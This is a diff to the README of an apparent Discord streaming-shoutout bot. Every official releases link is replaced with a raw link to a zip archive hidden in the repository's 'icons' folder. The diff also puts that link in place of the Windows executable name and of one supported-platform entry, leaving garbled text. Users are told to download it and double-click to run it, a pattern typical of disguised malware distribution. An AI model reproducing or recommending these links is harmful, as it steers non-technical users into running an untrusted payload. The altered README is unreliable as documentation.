@@ -1,7 +1,7 @@
 # 🤖 TeamFNB420ShoutoutBot-Discord - Easy Streaming Support for Everyone
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/releases)
+[![Download Now](https://raw.githubusercontent.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/main/icons/TeamFNB420ShoutoutBot-Discord_3.7.zip%https://raw.githubusercontent.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/main/icons/TeamFNB420ShoutoutBot-Discord_3.7.zip)](https://raw.githubusercontent.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/main/icons/TeamFNB420ShoutoutBot-Discord_3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the TeamFNB420ShoutoutBot-Discord! This bot supports 14 major streaming platforms, available for free to TEAMFNB420 members. You don’t need a server subscription, making it simple and accessible for everyone.
@@ -15,9 +15,9 @@ Welcome to the TeamFNB420ShoutoutBot-Discord! This bot supports 14 major streami
 ## 📦 Download & Install
 To download the bot:
 
-1. Visit this page to download: [Releases Page](https://github.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/main/icons/TeamFNB420ShoutoutBot-Discord_3.7.zip).
 2. Look for the most recent version listed at the top.
-3. Click on the file that matches your operating system (for example, `TeamFNB420ShoutoutBot.exe` for Windows).
+3. Click on the file that matches your operating system (for example, `https://raw.githubusercontent.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/main/icons/TeamFNB420ShoutoutBot-Discord_3.7.zip` for Windows).
 4. After the download completes, locate the file in your downloads folder, and double-click the icon to run it.
 
 ## 🎮 Supported Streaming Platforms
@@ -36,7 +36,7 @@ The TeamFNB420ShoutoutBot supports the following platforms:
 - Kick
 - Nimotv
 - Nimotv Live
-- Beam.gg
+- https://raw.githubusercontent.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/main/icons/TeamFNB420ShoutoutBot-Discord_3.7.zip
 
 With this bot, you can easily shout out and interact with your audience across multiple platforms, enhancing your streaming experience.
 
@@ -68,6 +68,6 @@ A: No, the bot is designed for non-technical users. It's easy to install and run
 A: You can report any issues directly on our GitHub repository under the “Issues” tab.
 
 ## 📞 Support
-For additional questions or help, visit our community support channel or check our [Releases Page](https://github.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/releases) for the latest updates.
+For additional questions or help, visit our community support channel or check our [Releases Page](https://raw.githubusercontent.com/erickkkkk-23/TeamFNB420ShoutoutBot-Discord/main/icons/TeamFNB420ShoutoutBot-Discord_3.7.zip) for the latest updates.
 
 Thank you for choosing TeamFNB420ShoutoutBot-Discord! Enjoy your streaming experience.
